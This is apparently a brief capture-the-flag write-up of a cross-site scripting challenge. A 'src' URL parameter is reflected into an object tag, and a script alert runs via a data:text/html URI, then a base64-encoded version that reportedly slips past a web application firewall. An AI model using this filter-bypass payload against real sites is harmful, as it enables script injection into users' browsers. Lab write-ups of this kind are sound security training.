# XSS_NSA_IMAGE

In the home page we found an image clickable.

Here we can see this in the url:

```
/?page=media&src=nsa
```

When we set the value of src to 'test' we have an image "wrong answer" and the parameter is stored here:

```
<object data="test"></object>
```

We can execute some javascript using:

```
/?page=media&src=data:text/html, <script>alert("xss")</script>
```

But we don't get the flag. We use base64 with the same payload to avoid WAF and that works:

```
/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik7PC9zY3JpcHQ=
```
